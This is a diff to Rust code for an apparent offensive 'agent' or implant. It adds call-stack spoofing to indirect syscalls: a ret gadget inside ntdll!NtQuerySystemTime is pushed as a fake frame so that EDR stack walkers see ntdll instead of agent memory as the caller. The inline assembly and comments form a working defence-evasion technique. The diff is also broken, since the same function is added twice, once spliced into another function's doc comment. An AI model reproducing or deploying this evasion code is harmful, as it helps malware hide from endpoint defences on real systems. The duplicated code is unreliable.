@@ -23,6 +23,14 @@ static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();
 #[cfg(windows)]
 static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock::new();
 
+/// Cached address of a `ret` (0xC3) byte within `ntdll!NtQuerySystemTime`.
+/// When the `stack-spoof` feature is active, this address is pushed onto the
+/// user-mode stack immediately before the syscall gadget is entered.  EDR
+/// kernel callbacks that walk the call stack then see ntdll as the immediate
+/// caller of the syscall stub instead of agent memory.
+#[cfg(all(windows, feature = "stack-spoof"))]
+static NTDLL_SPOOF_FRAME: OnceLock<usize> = OnceLock::new();
+
 #[cfg(windows)]
 #[derive(Clone, Copy, Debug)]
 pub struct SyscallTarget {
@@ -287,6 +295,48 @@ macro_rules! syscall {
     }};
 }
 
+/// Scan the first 64 bytes of `ntdll!NtQuerySystemTime` for a `ret` (0xC3)
+/// instruction and return its address.  This address is used as the synthetic
+/// return site pushed onto the stack before the syscall gadget is entered when
+/// `stack-spoof` is active:
+///
+///   do_syscall  →(jmp)→  syscall_gadget (syscall; ret)
+///                       → *this ret* inside NtQuerySystemTime (ret)
+///                       → real continuation inside do_syscall
+///
+/// `NtQuerySystemTime` is chosen as the cover function because it is a short,
+/// high-frequency stub whose call pattern is innocuous and whose `ret` is
+/// reachable within the first 32 bytes on all recent Windows versions.
+///
+/// Returns 0 if the function cannot be resolved or contains no `ret` in the
+/// first 64 bytes.
+#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+fn find_ntdll_spoof_frame() -> usize {
+    unsafe {
+        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+            Some(b) => b,
+            None => return 0,
+        };
+        let func_addr = match pe_resolve::get_proc_address_by_hash(
+            ntdll,
+            pe_resolve::hash_str(b"NtQuerySystemTime\0"),
+        ) {
+            Some(a) => a,
+            None => return 0,
+        };
+        // Scan for a `ret` (0xC3) within the first 64 bytes of the function.
+        // Most NT stubs reach their `ret` well within 32 bytes; 64 gives a
+        // generous margin for hooked or padded variants.
+        let probe = std::slice::from_raw_parts(func_addr as *const u8, 64);
+        for (i, &byte) in probe.iter().enumerate() {
+            if byte == 0xC3 {
+                return func_addr + i;
+            }
+        }
+        0
+    }
+}
+
 /// Verify that a gadget at `addr` of `len` bytes is safe to execute:
 ///   1. The entire gadget falls within a single committed memory region.
 ///   2. The region is executable.
@@ -298,6 +348,48 @@ macro_rules! syscall {
 /// - Primary call site: map_clean_ntdll gadget scan around line 140.
 /// - Secondary call site: find_jmp_rbx_gadget near the stack-spoofing helpers.
 /// - Related syscall dispatch entry: do_syscall immediately below.
+/// Scan the first 64 bytes of `ntdll!NtQuerySystemTime` for a `ret` (0xC3)
+/// instruction and return its address.  This address is used as the synthetic
+/// return site pushed onto the stack before the syscall gadget is entered when
+/// `stack-spoof` is active:
+///
+///   do_syscall  →(jmp)→  syscall_gadget (syscall; ret)
+///                       → *this ret* inside NtQuerySystemTime (ret)
+///                       → real continuation inside do_syscall
+///
+/// `NtQuerySystemTime` is chosen as the cover function because it is a short,
+/// high-frequency stub whose call pattern is innocuous and whose `ret` is
+/// reachable within the first 32 bytes on all recent Windows versions.
+///
+/// Returns 0 if the function cannot be resolved or contains no `ret` in the
+/// first 64 bytes.
+#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+fn find_ntdll_spoof_frame() -> usize {
+    unsafe {
+        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+            Some(b) => b,
+            None => return 0,
+        };
+        let func_addr = match pe_resolve::get_proc_address_by_hash(
+            ntdll,
+            pe_resolve::hash_str(b"NtQuerySystemTime\0"),
+        ) {
+            Some(a) => a,
+            None => return 0,
+        };
+        // Scan for a `ret` (0xC3) within the first 64 bytes of the function.
+        // Most NT stubs reach their `ret` well within 32 bytes; 64 gives a
+        // generous margin for hooked or padded variants.
+        let probe = std::slice::from_raw_parts(func_addr as *const u8, 64);
+        for (i, &byte) in probe.iter().enumerate() {
+            if byte == 0xC3 {
+                return func_addr + i;
+            }
+        }
+        0
+    }
+}
+
 #[cfg(windows)]
 unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
     use winapi::um::memoryapi::VirtualQuery;
@@ -366,6 +458,18 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         let stack_ptr: *const u64 = stack_args.as_ptr();
         let status: i32;
 
+        // Resolve the synthetic ntdll return-site for call-stack spoofing.
+        // When `stack-spoof` is active and the gadget is found, this value is
+        // pushed as a fake frame so EDR walkers see ntdll as the caller.
+        // When the feature is disabled or the gadget is unavailable, the value
+        // is 0 and the `jz 44f` branch inside the asm falls back to the plain
+        // `call r11` path with no additional overhead beyond a single test+jz.
+        #[cfg(feature = "stack-spoof")]
+        let spoof_frame: usize =
+            *NTDLL_SPOOF_FRAME.get_or_init(|| find_ntdll_spoof_frame());
+        #[cfg(not(feature = "stack-spoof"))]
+        let spoof_frame: usize = 0;
+
         // SAFETY: Register allocation constraints are explicit to guarantee that
         // `nstack` and `stack_ptr` can never share a register with `a1` or `a2`.
         //
@@ -422,10 +526,49 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             "mov r10, rcx",
             "mov eax, {ssn:e}",
             "mov r11, {gadget}",
-            "call r11", // indirect syscall
+            // ── Call-stack spoofing (feature = "stack-spoof") ─────────────────
+            // When `spoof_frame` is non-zero (a valid `ret` inside ntdll was
+            // found), build a two-entry fake frame chain before jumping to the
+            // syscall gadget:
+            //
+            //   [rsp+0]:  spoof_frame  — `ret` inside ntdll!NtQuerySystemTime
+            //   [rsp+8]:  label 43     — our real continuation in do_syscall
+            //
+            // Execution flow:
+            //   jmp r11 → syscall_gadget (syscall; ret)
+            //           → spoof_frame (0xC3 ret inside ntdll)
+            //           → label 43 (real continuation)
+            //
+            // EDR kernel callbacks walking the user-mode stack during the
+            // kernel transition see the chain:
+            //   ntdll!NtQuerySystemTime+N  ← immediate return site (spoofed)
+            //   do_syscall (label 43)       ← one further level
+            //
+            // This keeps the topmost visible frame entirely within ntdll,
+            // eliminating the "call from unbacked memory" indicator.
+            //
+            // When `spoof_frame` == 0 (feature off or gadget unavailable),
+            // `jz 44f` falls through to the plain `call r11` path so the
+            // existing behaviour is preserved with negligible overhead.
+            "test {spoof_frame}, {spoof_frame}",
+            "jz 44f",
+            // Spoofed path: push fake call chain, then jump to syscall gadget.
+            "lea r15, [rip + 43f]",    // r15 = address of label 43 (real continuation)
+            "push r15",                 // [rsp]   = real continuation  (popped by ntdll ret)
+            "mov r15, {spoof_frame}",  // r15 = NtQuerySystemTime ret-gadget address
+            "push r15",                 // [rsp]   = spoof_frame         (popped by gadget ret)
+            "jmp r11",                  // → syscall_gadget; ret → spoof_frame; ret → 43:
+            "43:",
+            "jmp 45f",
+            // Plain indirect syscall (default, or fallback when spoof_frame == 0):
+            "44:",
+            "call r11",
+            // ─────────────────────────────────────────────────────────────────
+            "45:",
             "mov rsp, r14",
-            ssn    = in(reg) ssn,
-            gadget = in(reg) gadget_addr,
+            ssn         = in(reg) ssn,
+            gadget      = in(reg) gadget_addr,
+            spoof_frame = in(reg) spoof_frame,
             // nstack → rcx; stack_ptr → rsi.  Explicit inout constraints prevent
             // the compiler from co-allocating either with a1/a2/ssn/gadget.
             inout("rcx") nstack => _,
@@ -439,7 +582,7 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             inlateout("r9")  a4 => _,
             lateout("rax") status,
             out("rdx") _, out("r10") _, out("r11") _,
-            out("r14") _,
+            out("r14") _, out("r15") _,
             out("rdi") _,
             // NOTE: nostack intentionally absent — this asm block modifies RSP.
         );
